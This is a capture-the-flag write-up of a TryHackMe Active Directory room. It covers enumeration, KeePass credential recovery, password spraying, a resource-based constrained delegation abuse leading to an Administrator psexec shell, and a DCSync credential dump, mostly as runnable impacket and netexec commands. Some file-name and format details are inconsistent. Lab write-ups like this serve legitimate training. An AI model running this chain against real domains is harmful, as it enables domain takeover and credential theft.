---
title: "Foward"
date: 2026-06-25 09:00:00 +0800
categories: [CTF Write-ups, TryHackMe]
tags: [tryhackme, active-directory, medium, windows]
description: "TryHackMe Foward write-up — attacking an Active Directory environment."
image:
  path: /assets/img/posts/thm/Foward/foward.png
  alt: "Foward"
---

### LAB info
**Link : [Foward](https://tryhackme.com/room/forwardchallenge)**

**Description : Now is the time to move foward in this AD challenge**

**Difficulty : Medium**

**Subscription only**

### Initial Credential

**USER > ctf.local\j.smith**

**PASS > JSmith@IT2024**

### nmap scan 

```bash
nmap -sS 10.49.187.53 -p-
```

```output
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
7680/tcp  open  pando-pub
9389/tcp  open  adws
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
```

### Smb and ldap enumeration 

```bash
netexec smb 10.49.187.53 -u 'ctf.local\j.smith' -p 'JSmith@IT2024' --shares
```

![Image1](/assets/img/posts/thm/Foward/foward-1.png)



```bash
netexec ldap 10.49.187.53 -u 'ctf.local\j.smith' -p 'JSmith@IT2024' --port 389 --users
```

![Image1](/assets/img/posts/thm/Foward/foward-2.png)

### Rdp

```bash
xfreerdp /v:10.49.143.55 /u:j.smith /p:'JSmith@IT2024' /d:ctf.local +clipboard /dynamic-resolution /drive:ahah,/home/kali/Downloads
```

found keepass file on documents folder and try to crack it but failed 


### bloodhound 

```cmd
SharpHound.exe  --CollectionMethods All --Domain ctf.local
```

then found the current user actually does nothing towards administrator but when run check path to domain admin found smtg intersting 

![Image1](/assets/img/posts/thm/Foward/foward-3.png)

R.william have the AllowedtoAct permission on the domain controller , the attack can perform is https://bloodhound.specterops.io/resources/edges/allowed-to-act

AllowedtoAct is acutally known as resource-based constrained delegation . Every computer account in Active Directory has a hidden attribute called:
 `msDS-AllowedToActOnBehalfOfOtherIdentity` 
 If a computer (like `DC01`) populates this attribute with the name of another account (like `attackersystem$`), it tells the domain:
 _"I explicitly trust `attackersystem$`. If `attackersystem$` comes to me claiming to be another user, I will believe it and grant them access."


The exploit overview 
###### How the Exploit Walks Through the Building

Because of the **AllowedToAct** setting you injected, the "building rules" get twisted:

1. **Getting the TGT:** Your new computer account (`attackersystem$`) presents its password to the Key Distribution Center (KDC). The KDC says, _"Your credentials match. Here is your machine ID badge (TGT)."_
    
2. **Asking for the TGS:** Now, your machine account walks up to the ticket counter, shows its machine ID badge, and makes an unusual request: _"Hey, the Domain Administrator is hanging out at my desk, and he wants me to access the files on `DC01`. Here is the proof."_
    
3. **The Guard Checks the Rulebook:** The KDC looks at `DC01`'s rulebook (the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute). It sees a rule written by `r.williams` that says: **"I explicitly trust `attackersystem$` to fetch keys for other users."**
    
4. **The High-Privilege TGS is Issued:** The KDC says, _"The rulebook allows it! Here is a specific room keycard (TGS) for the `cifs` (file share) service on `DC01`, and the name printed on the ticket is **Administrator**."_

### some extra knowledge

Resource-Based Constrained Delegation (RBCD) will related with another 2 kerberos extension known as **S4U2self** and **S4U2proxy** , both of them know as  **S4U (Service for User)**.

**S4U2self**
- is let the service or computer account  to request a TGS on behalf of the user without password 

**S4U2proxy**
- foward TGS ticket obtained from  **S4U2self** to the target service 

**Resource-Based Constrained Delegation (RBCD):** The backend resource itself decides. When the KDC receives the **S4U2proxy** request from your computer account, it looks at the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. Since that attribute says, _"I trust `attackersystem$`"_, the KDC approves the S4U2proxy request and issues the final high-privilege ticket.

### Keepass

now we continue actually we can search the keepass on the host and use the windows user account to authenticate cuz it using ntlm and we will get the cred

cred found 
```output
Michael321
12345

t.jones
Helpdesk01!
```

### Password spray

now we can try password spray with our new cred against the user we found 

first create a list of user and password 

```bash
netexec smb DC01.ctf.local -u users.txt -p password.txt --continue-on-success
```

use --continue-on-sucess means although it found a cred it will continue untill all finish 
![Image1](/assets/img/posts/thm/Foward/foward-4.png)

the password for t.jones also apply for r.williams thus we can start the exploit 

### Exploit and get flag

for my own approach i following this https://bloodhound.specterops.io/resources/edges/allowed-to-act

then at last i extract out the ticket cuz i dunno why it cannot function then i convert it to cacche format . 

kirbi - is on windows 
cacche - is on linux

how we convert
```bash
impacket-ticketConverter admin_cifs_DC01.ctf.local.kirbi admin.cacche
```

then we export it 
```bash
export KRB5CCNAME=admin.ccache
```

last since we requets for the cifs thus we can use get a shell through psexec

```bash
impacket-psexec -k -no-pass ctf.local/Administrator@DC01.ctf.local -dc-ip 10.49.143.55
```

-k mean use kerberos 

-no-pass means no password prompt since we are using kerberos ticket

**Note:** When using Kerberos (`-k`), you **must** use the Fully Qualified Domain Name (FQDN) here (`DC01.ctf.local`) rather than an IP address. Kerberos tickets are cryptographically locked to SPN strings; if you try to put a raw IP here, the Kerberos handshake will fail instantly.

we also need mention dc-ip since we are using attacking machine 

![Image1](/assets/img/posts/thm/Foward/foward-5.png)



### alternative ways 

remote add no need rdp 

add the machine account
```bash
impacket-addcomputer -computer-name 'attacker$' -computer-pass 'tryhackme' -dc-ip 10.49.152.120 'ctf.local/r.williams:Helpdesk01!'
```

now we need add our created macine account into the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity`attribute, configuring Resource-Based Constrained Delegation so that `attacker$` is now trusted to impersonate any user to the Domain Controller.

```bash
impacket-rbcd -dc-ip 10.49.152.120 -delegate-from 'attacker$' -delegate-to 'DC01$' -action write 'ctf.local/r.williams:Helpdesk01!'
```

now we need use machine account created to request for the service ticket and impersonate as administrator 
when impersonate make sure the user account we use is exist and have high privilege

```bash
impacket-getST -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/attacker$:tryhackme'
```

then export it 

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache 
```

get the shell

```bash
impacket-psexec -k -no-pass -dc-ip 10.49.152.120 ctf.local/Administrator@DC01.ctf.local
```

perform dcsync attack 

```bash
impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local
```
